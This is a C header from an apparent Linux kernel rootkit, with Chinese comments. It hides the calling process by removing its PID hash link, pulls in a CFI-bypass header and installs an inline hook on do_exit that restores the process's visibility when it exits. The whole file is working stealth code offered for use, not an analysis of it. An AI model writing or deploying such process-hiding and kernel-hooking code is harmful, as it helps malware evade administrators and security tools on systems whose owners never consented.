#ifndef HIDE_PROCESS_H
#define HIDE_PROCESS_H

#include <linux/module.h>
#include <linux/sched.h>
#include <linux/version.h>
#include "bypass_cfi.h"
#include "inline_hook_frame.h"

// ---------- 原有的隐藏/恢复函数 ----------
static inline void hide_pid_process(struct task_struct *task)
{
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 19, 0)
    hlist_del_init(&task->pid_links[PIDTYPE_PID]);
#else
    hlist_del_init(&task->pids[PIDTYPE_PID].node);
#endif
}

static inline void recover_process(struct task_struct *task)
{
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 19, 0)
    hlist_add_head_rcu(&task->pid_links[PIDTYPE_PID],
                       &task->thread_pid->tasks[PIDTYPE_PID]);
#else
    hlist_add_head_rcu(&task->pids[PIDTYPE_PID].node,
                       &task->pids[PIDTYPE_PID].pid->tasks[PIDTYPE_PID]);
#endif
}

// ---------- 自动恢复机制（直接恢复，无工作队列）----------
static pid_t g_hidden_pid = 0;
static struct hook_entry g_do_exit_hook[1];
static bool g_do_exit_hook_installed = false;

// do_exit 钩子工作函数：在进程退出前直接恢复 PID 可见性
static int do_exit_hook_work(struct pt_regs *regs)
{
    pid_t exiting = task_pid_nr(current);
    pid_t hidden = READ_ONCE(g_hidden_pid);
    if (hidden && exiting == hidden) {
        // 直接恢复，不经过工作队列，避免时序问题
        recover_process(current);
        WRITE_ONCE(g_hidden_pid, 0);
        pr_info("hide_process: 进程 %d 退出，已恢复 PID 可见性\n", hidden);

        // 卸载钩子自身
        inline_hook_remove(g_do_exit_hook);
        g_do_exit_hook_installed = false;
        pr_info("hide_process: do_exit 钩子已自动卸载\n");
    }
    return 0;   // 继续执行原 do_exit
}

// 安装 do_exit 钩子
static int install_do_exit_hook(void)
{
    if (g_do_exit_hook_installed)
        return 0;

    g_do_exit_hook[0] = (struct hook_entry){
        .target_sym = "do_exit",
        .target_addr = 0,
        .work_fn = do_exit_hook_work,
        .trampoline = NULL,
        .saved_insn = {0},
        .installed = false,
        .slot_index = -1,
    };
    int ret = inline_hook_install(g_do_exit_hook);
    if (ret) {
        pr_err("hide_process: 安装 do_exit 钩子失败 %d\n", ret);
        return ret;
    }
    g_do_exit_hook_installed = true;
    return 0;
}

// ---------- 对外接口 ----------
/**
 * hide_current_process - 隐藏当前进程（调用者），并设置退出时自动恢复
 * 返回值：0 成功，负值失败
 */
static inline int hide_current_process(void)
{
    pid_t pid = task_pid_nr(current);
    int ret;

    // 如果已经隐藏了其他进程，先恢复（简化：只允许同时隐藏一个）
    if (READ_ONCE(g_hidden_pid) != 0 && READ_ONCE(g_hidden_pid) != pid) {
        struct task_struct *old = pid_task(find_vpid(READ_ONCE(g_hidden_pid)), PIDTYPE_PID);
        if (old) recover_process(old);
        WRITE_ONCE(g_hidden_pid, 0);
    }

    // 隐藏当前进程
    hide_pid_process(current);

    // 确保 do_exit 钩子已安装
    ret = install_do_exit_hook();
    if (ret) {
        return ret;
    }

    WRITE_ONCE(g_hidden_pid, pid);
    pr_info("hide_process: 已隐藏当前进程 PID %d，退出时自动恢复\n", pid);
    return 0;
}

#endif /* HIDE_PROCESS_H */
